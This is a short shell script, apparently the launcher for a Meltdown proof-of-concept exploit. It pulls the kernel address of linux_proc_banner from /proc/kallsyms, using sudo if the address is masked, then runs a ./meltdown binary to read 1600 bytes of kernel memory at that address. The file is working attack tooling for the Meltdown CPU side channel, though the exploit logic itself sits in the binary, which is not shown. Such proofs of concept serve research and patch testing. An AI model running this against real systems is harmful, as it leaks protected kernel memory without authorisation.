#!/bin/sh -x
linux_proc_banner=$(awk '/linux_proc_banner/ { print $1 }' /proc/kallsyms)
if test $linux_proc_banner = "0000000000000000"; then
	linux_proc_banner=$(sudo awk '/linux_proc_banner/ { print $1 }' /proc/kallsyms)
fi
./meltdown $linux_proc_banner 1600
